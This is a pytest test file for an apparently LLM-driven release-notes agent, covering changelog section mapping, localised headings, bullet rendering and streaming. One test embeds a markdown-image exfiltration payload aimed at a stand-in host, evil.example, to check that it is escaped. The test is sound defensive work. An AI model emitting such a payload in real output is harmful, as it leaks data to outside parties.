from unittest.mock import AsyncMock

import pytest
from swiss_ai_hub.core.generative_ai import LLMConfig
from swiss_ai_hub.core.i18n import LocaleString
from swiss_ai_hub.core.jira import JiraConnectionConfig

from swiss_ai_hub.agent.agents.release_notes_agent.changelog_entry import ChangelogEntry
from swiss_ai_hub.agent.agents.release_notes_agent.changelog_renderer import ChangelogRenderer
from swiss_ai_hub.agent.agents.release_notes_agent.changelog_section import ChangelogSection
from swiss_ai_hub.agent.agents.release_notes_agent.changelog_stream import ChangelogStream
from swiss_ai_hub.agent.agents.release_notes_agent.release_language import ReleaseLanguage
from swiss_ai_hub.agent.agents.release_notes_agent.release_note import ReleaseNote
from swiss_ai_hub.agent.agents.release_notes_agent.release_notes_agent_config import ReleaseNotesAgentConfig
from swiss_ai_hub.agent.i18n.agent_locale_handler import AgentLocaleHandler

_T = AgentLocaleHandler("en")


def _note(key: str, section: ChangelogSection, note: str) -> ReleaseNote:
    project, number = key.split("-")
    return ReleaseNote(
        key=key,
        url=f"https://jira.example.com/browse/{key}",
        project=project,
        number=int(number),
        section=section,
        summary=f"Summary of {key}",
        note=note,
    )


def _entry(key: str, section: ChangelogSection, text: str) -> ChangelogEntry:
    return ChangelogEntry.of_note(_note(key, section, text))


@pytest.mark.parametrize(
    ("issue_type", "section"),
    [
        ("Bug", ChangelogSection.FIXES),
        ("  bug ", ChangelogSection.FIXES),
        ("Fehler", ChangelogSection.FIXES),
        ("Story", ChangelogSection.FEATURES),
        ("New Feature", ChangelogSection.FEATURES),
        ("Nouvelle fonctionnalité", ChangelogSection.FEATURES),
        ("Improvement", ChangelogSection.IMPROVEMENTS),
        ("Verbesserung", ChangelogSection.IMPROVEMENTS),
        ("Task", ChangelogSection.OTHER),
        ("Sub-task", ChangelogSection.OTHER),
        ("Epic", ChangelogSection.OTHER),
        (None, ChangelogSection.OTHER),
    ],
)
def test_issue_types_map_to_changelog_sections(issue_type: str | None, section: ChangelogSection):
    assert ChangelogSection.of_issue_type(issue_type) is section


def test_sections_rank_in_changelog_order():
    assert [section.rank for section in ChangelogSection] == [0, 1, 2, 3]
    assert list(ChangelogSection) == [
        ChangelogSection.FEATURES,
        ChangelogSection.FIXES,
        ChangelogSection.IMPROVEMENTS,
        ChangelogSection.OTHER,
    ]


@pytest.mark.parametrize(
    ("language", "title", "fixes"),
    [
        (ReleaseLanguage.EN, "## Release notes 2.0\n", "\n### Fixes\n\n"),
        (ReleaseLanguage.DE, "## Versionshinweise 2.0\n", "\n### Fehlerbehebungen\n\n"),
        (ReleaseLanguage.FR, "## Notes de version 2.0\n", "\n### Corrections\n\n"),
        (ReleaseLanguage.IT, "## Note di rilascio 2.0\n", "\n### Correzioni\n\n"),
    ],
)
def test_titles_and_headings_are_in_the_block_language_whatever_the_run_locale(
    language: ReleaseLanguage, title: str, fixes: str
):
    assert ChangelogRenderer.title("2.0", language, _T) == title
    assert ChangelogRenderer.heading(ChangelogSection.FIXES, language, _T) == fixes


def test_every_section_has_a_heading_in_every_language():
    for language in ReleaseLanguage:
        headings = {ChangelogRenderer.heading(section, language, _T) for section in ChangelogSection}
        assert len(headings) == len(ChangelogSection)
        assert not any("release_notes_agent" in heading for heading in headings)


def test_a_bullet_of_its_own_leads_with_its_linked_key_in_bold_brackets():
    entry = _entry("ENG-12", ChangelogSection.FIXES, "Sign-in works\nagain  after a  timeout.")

    assert ChangelogRenderer.bullet(entry, link_tickets=True, keys_first=True) == (
        "- **[[ENG-12](https://jira.example.com/browse/ENG-12)]** Sign-in works again after a timeout.\n"
    )
    assert ChangelogRenderer.bullet(entry, link_tickets=False, keys_first=True) == (
        "- Sign-in works again after a timeout.\n"
    )


def test_a_merged_bullet_ends_with_every_ticket_it_covers():
    notes = [_note(key, ChangelogSection.FEATURES, f"Export of {key}.") for key in ("ENG-1", "SD-4")]
    entry = ChangelogEntry(section=ChangelogSection.FEATURES, text="CSV export for invoices and search.", notes=notes)

    assert ChangelogRenderer.bullet(entry, link_tickets=True, keys_first=False) == (
        "- CSV export for invoices and search. "
        "([ENG-1](https://jira.example.com/browse/ENG-1), [SD-4](https://jira.example.com/browse/SD-4))\n"
    )
    assert ChangelogRenderer.bullet(entry, link_tickets=False, keys_first=False) == (
        "- CSV export for invoices and search.\n"
    )


def test_markdown_in_a_note_is_shown_as_written_never_rendered():
    """An image the chat rendered would be loaded at once, sending whatever its address carries."""
    entry = _entry("ENG-12", ChangelogSection.FIXES, "Export ![x](https://evil.example/?d=ENG-13) <img src=x> *now*")

    assert ChangelogRenderer.bullet(entry, link_tickets=True, keys_first=True) == (
        "- **[[ENG-12](https://jira.example.com/browse/ENG-12)]** "
        "Export !\\[x\\](https://evil.example/?d=ENG-13) \\<img src=x\\> \\*now\\*\n"
    )
    assert ChangelogRenderer.title("2.0_beta [rc]", ReleaseLanguage.EN, _T) == "## Release notes 2.0\\_beta \\[rc\\]\n"


@pytest.mark.parametrize(
    ("merge_related_tickets", "bullet"),
    [
        (False, "- **[[ENG-12](https://jira.example.com/browse/ENG-12)]** Dark mode.\n"),
        (True, "- Dark mode. ([ENG-12](https://jira.example.com/browse/ENG-12))\n"),
    ],
)
@pytest.mark.asyncio
async def test_the_keys_lead_the_bullets_only_when_tickets_are_not_merged(merge_related_tickets: bool, bullet: str):
    config = ReleaseNotesAgentConfig(
        agent_id="release-notes",
        name=LocaleString(en="Release notes"),
        description=LocaleString(en="Writes release notes."),
        llm=LLMConfig(model_name="text-generation/gemma-4-31B-it"),
        jira=JiraConnectionConfig(),
        merge_related_tickets=merge_related_tickets,
    )
    stream = ChangelogStream.from_config(AsyncMock(), _T, config)

    await stream.add([_entry("ENG-12", ChangelogSection.FEATURES, "Dark mode.")])

    assert stream.text == f"\n### New features\n\n{bullet}"


@pytest.mark.asyncio
async def test_the_stream_keeps_exactly_the_text_it_shows():
    displayer = AsyncMock()
    stream = ChangelogStream(displayer, _T, link_tickets=False, keys_first=False, model_name="gemma")

    await stream.begin(ReleaseLanguage.EN, "2.0")
    await stream.add([_entry("ENG-1", ChangelogSection.FEATURES, "Export to CSV.")])
    await stream.add(
        [_entry("ENG-2", ChangelogSection.FEATURES, "Dark mode."), _entry("ENG-3", ChangelogSection.FIXES, "No crash.")]
    )
    await stream.begin(ReleaseLanguage.DE, "2.0")
    await stream.add([_entry("ENG-1", ChangelogSection.FEATURES, "Export nach CSV.")])

    shown = [call.args[0] for call in displayer.display_chunk.await_args_list]
    assert stream.text == "".join(shown)
    assert stream.text == (
        "## Release notes 2.0\n"
        "\n### New features\n\n- Export to CSV.\n"
        "- Dark mode.\n\n### Fixes\n\n- No crash.\n"
        "\n## Versionshinweise 2.0\n"
        "\n### Neue Funktionen\n\n- Export nach CSV.\n"
    )
    assert {call.kwargs["model_name"] for call in displayer.display_chunk.await_args_list} == {"gemma"}


@pytest.mark.asyncio
async def test_the_stream_shows_nothing_for_an_empty_batch():
    displayer = AsyncMock()
    stream = ChangelogStream(displayer, _T, link_tickets=True, keys_first=False, model_name="gemma")

    await stream.add([])

    displayer.display_chunk.assert_not_awaited()
    assert stream.text == ""
